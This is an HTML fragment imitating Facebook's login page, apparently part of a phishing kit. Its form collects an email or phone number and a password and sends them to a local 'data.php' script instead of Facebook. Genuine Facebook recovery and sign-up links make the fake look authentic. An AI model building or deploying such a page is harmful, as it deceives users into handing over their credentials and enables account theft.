<main>
	<div class="content">
		<div class="content-header">
			Log Into Facebook
		</div>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" placeholder="Email address or phone number"  title="  Enter correct Email address or phone number" required>
				<input type="password" name="userpassword" placeholder="Password" pattern=".{5,}" title="Five or more characters" required>
				<input type="submit" name="data" value="Log In">
			</form>
			<div class="signinLink">
				<a href="https://www.facebook.com/recover/initiate?lwv=100&amp;ars=facebook_login"  target="_blank">Forgotten account?</a>
				<span> · </span>
				<a href="https://www.facebook.com/r.php?locale=en_GB&amp;display=page" target="_blank">Sign up for Facebook</a>
			</div>
		</div>
	</div>
</main>